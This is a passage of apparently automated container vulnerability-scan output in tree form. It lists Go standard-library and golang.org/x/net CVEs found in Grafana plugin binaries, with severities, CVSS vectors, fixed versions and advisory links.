│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│                       │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│                       │     │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29980 
│                       │     │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:29981 
│                       │     │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33574 
│                       │     │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34357 
│                       │     │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34359 
│                       │     │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:35832 
│                       │     │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36317 
│                       │     │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36648 
│                       │     │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36797 
│                       │     │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:38995 
│                       │     │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39005 
│                       │     │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39573 
│                       │     │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:39879 
│                       │     │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41030 
│                       │     │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41036 
│                       │     │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:41930 
│                       │     │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42043 
│                       │     │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42047 
│                       │     │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42049 
│                       │     │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42050 
│                       │     │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42051 
│                       │     │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42079 
│                       │     │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42080 
│                       │     │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42082 
│                       │     │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42142 
│                       │     │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42150 
│                       │     │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42151 
│                       │     │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42240 
│                       │     │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42644 
│                       │     │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:42946 
│                       │     │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:44622 
│                       │     │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:46394 
│                       │     │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:46395 
│                       │     │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:47149 
│                       │     │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
│                       │     │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
│                       │     │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
│                       │     │                  ├ [39]: https://bugzilla.redhat.com/2445356 
│                       │     │                  ├ [40]: https://bugzilla.redhat.com/2484207 
│                       │     │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│                       │     │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│                       │     │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-25679 
│                       │     │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-27145 
│                       │     │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
│                       │     │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
│                       │     │                  ├ [47]: https://go.dev/cl/783621 
│                       │     │                  ├ [48]: https://go.dev/issue/79694 
│                       │     │                  ├ [49]: https://groups.google.com/g/golang-announce/c/tKs3rmcB
│                       │     │                  │       cKw 
│                       │     │                  ├ [50]: https://linux.oracle.com/cve/CVE-2026-27145.html 
│                       │     │                  ├ [51]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
│                       │     │                  ├ [52]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
│                       │     │                  ├ [53]: https://pkg.go.dev/vuln/GO-2026-5037 
│                       │     │                  ├ [54]: https://security.access.redhat.com/data/csaf/v2/vex/20
│                       │     │                  │       26/cve-2026-27145.json 
│                       │     │                  ╰ [55]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
│                       │     ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
│                       │     ╰ LastModifiedDate: 2026-07-31T13:17:40.873Z 
│                       ├ [5] ╭ VulnerabilityID : CVE-2026-39822 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-4970 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:a6cd26e8cfe434e62f7b00530ea6696be2030e417b9f1d8c164874
│                       │     │                   f9e0ff64ea 
│                       │     ├ Title           : os: golang: Go os.Root: Symlink following vulnerability
│                       │     │                   allows directory traversal 
│                       │     ├ Description     : On Unix systems, opening a file in an os.Root improperly
│                       │     │                   follows symlinks to locations outside of the Root when the
│                       │     │                   final path component of the a path is a symbolic link and the
│                       │     │                    path ends in /. For example, 'root.Open("symlink/")' will
│                       │     │                   open "symlink" even when "symlink" is a symbolic link
│                       │     │                   pointing outside of the root. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-61 
│                       │     ├ VendorSeverity   ╭ alma       : 3 
│                       │     │                  ├ amazon     : 2 
│                       │     │                  ├ bitnami    : 3 
│                       │     │                  ├ oracle-oval: 3 
│                       │     │                  ├ redhat     : 3 
│                       │     │                  ╰ rocky      : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H
│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 7.8 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.8 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
│                       │     │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
│                       │     │                  ├ [2] : https://bugzilla.redhat.com/2498152 
│                       │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│                       │     │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-39822 
│                       │     │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
│                       │     │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
│                       │     │                  ├ [7] : https://go.dev/cl/797880 
│                       │     │                  ├ [8] : https://go.dev/issue/79005 
│                       │     │                  ├ [9] : https://groups.google.com/g/golang-announce/c/OrmQE_Yp
│                       │     │                  │       5Sc 
│                       │     │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-39822.html 
│                       │     │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
│                       │     │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
│                       │     │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-4970 
│                       │     │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
│                       │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
│                       │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
│                       ├ [6] ╭ VulnerabilityID : CVE-2026-42504 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5038 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.11, 1.26.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:dfa8d31e0485bcee6d0c0aa2923d38f3f418e11728f3eda5a5292c
│                       │     │                   18c2890557 
│                       │     ├ Title           : mime: golang: Golang MIME: Denial of Service via
│                       │     │                   maliciously-crafted MIME header 
│                       │     ├ Description     : Decoding a maliciously-crafted MIME header containing many
│                       │     │                   invalid encoded-words can consume excessive CPU. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-407 
│                       │     ├ VendorSeverity   ╭ amazon : 2 
│                       │     │                  ├ azure  : 3 
│                       │     │                  ├ bitnami: 3 
│                       │     │                  ╰ redhat : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
│                       │     │                  ├ [1]: https://go.dev/cl/774481 
│                       │     │                  ├ [2]: https://go.dev/issue/79217 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
│                       │     ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
│                       │     ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│                       ├ [7] ╭ VulnerabilityID : CVE-2026-42505 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5856 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:fc556a52b29e053d6a73d4cb3df8b09fea5397dbfe55cce6713d6c
│                       │     │                   62762da5c4 
│                       │     ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in
│                       │     │                   Encrypted Client Hello 
│                       │     ├ Description     : Handshakes which used Encrypted Client Hello could be
│                       │     │                   de-anonymized by a passive network observer due to a
│                       │     │                   disclosure of pre-shared key identities in the unencrypted
│                       │     │                   client hello. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-201 
│                       │     ├ VendorSeverity   ╭ amazon : 2 
│                       │     │                  ├ bitnami: 2 
│                       │     │                  ╰ redhat : 2 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
│                       │     │                  │         │           /A:N 
│                       │     │                  │         ╰ V3Score : 5.3 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
│                       │     │                            │           /A:N 
│                       │     │                            ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
│                       │     │                  ├ [1]: https://go.dev/cl/775960 
│                       │     │                  ├ [2]: https://go.dev/issue/79282 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
│                       │     ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
│                       │     ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
│                       ╰ [8] ╭ VulnerabilityID : CVE-2026-42507 
│                             ├ VendorIDs        ─ [0]: GO-2026-5039 
│                             ├ PkgID           : stdlib@v1.26.3 
│                             ├ PkgName         : stdlib 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                             │                  ╰ UID : f77aad5d3fa73e61 
│                             ├ InstalledVersion: v1.26.3 
│                             ├ FixedVersion    : 1.25.11, 1.26.4 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                             │                  │         92562dadc4ee6c7523d 
│                             │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                             │                            afbb07074e22b1af86c 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Fingerprint     : sha256:2319965ed2fb6f3fe4327520d567f891c695ef3a3aa6dca91b4e32
│                             │                   09d6987971 
│                             ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error
│                             │                    messages via input injection 
│                             ├ Description     : When returning errors, functions in the net/textproto package
│                             │                    would include its input as part of the error. This might
│                             │                   allow an attacker to inject misleading content to errors that
│                             │                    are printed or logged. 
│                             ├ Severity        : MEDIUM 
│                             ├ VendorSeverity   ╭ alma       : 2 
│                             │                  ├ amazon     : 2 
│                             │                  ├ bitnami    : 2 
│                             │                  ├ oracle-oval: 2 
│                             │                  ├ redhat     : 2 
│                             │                  ╰ rocky      : 2 
│                             ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
│                             │                  │         │           /A:N 
│                             │                  │         ╰ V3Score : 5.3 
│                             │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
│                             │                            │           /A:N 
│                             │                            ╰ V3Score : 5.3 
│                             ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
│                             │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
│                             │                  ├ [2] : https://bugzilla.redhat.com/2484205 
│                             │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
│                             │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│                             │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                             │                  │       6-27145 
│                             │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                             │                  │       6-42507 
│                             │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
│                             │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
│                             │                  ├ [9] : https://go.dev/cl/777060 
│                             │                  ├ [10]: https://go.dev/issue/79346 
│                             │                  ├ [11]: https://groups.google.com/g/golang-announce/c/tKs3rmcB
│                             │                  │       cKw 
│                             │                  ├ [12]: https://linux.oracle.com/cve/CVE-2026-42507.html 
│                             │                  ├ [13]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
│                             │                  ├ [14]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
│                             │                  ├ [15]: https://pkg.go.dev/vuln/GO-2026-5039 
│                             │                  ╰ [16]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
│                             ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
│                             ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
╰ [8] ╭ Target         : usr/share/grafana/data/plugins-bundled/zipkin/gpx_grafana-zipkin-datasource_linux_amd64 
      ├ Class          : lang-pkgs 
      ├ Type           : gobinary 
      ├ Packages        
      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : CVE-2026-25681 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5029 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:c094a43c55b8677f646a697926d63a3dc4b8269fc61fb6d7c057d
                        │      │                   9d638f2892b 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code
                        │      │                    execution via Cross-Site Scripting 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.1 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
                        │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
                        │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
                        │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
                        │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-25681 
                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27136 
                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39829 
                        │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39832 
                        │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39835 
                        │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-42508 
                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-57231 
                        │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
                        │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
                        │      │                  ├ [25]: https://go.dev/cl/781703 
                        │      │                  ├ [26]: https://go.dev/issue/79574 
                        │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                        │      │                  │       0lu8 
                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-25681.html 
                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
                        │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5029 
                        │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
                        │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [1]  ╭ VulnerabilityID : CVE-2026-27136 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5030 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:292cb5dba5bf591a1a45dd1d37f1583e33c2e48fef6512b157173
                        │      │                   27c2134f06e 
                        │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html:
                        │      │                   Cross-Site Scripting via HTML parsing bypass 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 3 
                        │      │                  ├ azure      : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 8.1 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-27136 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
                        │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
                        │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
                        │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
                        │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
                        │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
                        │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
                        │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
                        │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
                        │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
                        │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
                        │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-25681 
                        │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27136 
                        │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39829 
                        │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39832 
                        │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39835 
                        │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-42508 
                        │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-57231 
                        │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
                        │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
                        │      │                  ├ [25]: https://go.dev/cl/781685 
                        │      │                  ├ [26]: https://go.dev/issue/79575 
                        │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI
                        │      │                  │       0lu8 
                        │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-27136.html 
                        │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
                        │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-27136 
                        │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5030 
                        │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-27136 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.087Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [2]  ╭ VulnerabilityID : CVE-2026-33814 
                        │      ├ VendorIDs        ─ [0]: GO-2026-4918 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.53.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdb
                        │      │                  │         e92562dadc4ee6c7523d 
                        │      │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d
                        │      │                            9afbb07074e22b1af86c 
                        │      ├ SeveritySource  : nvd 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
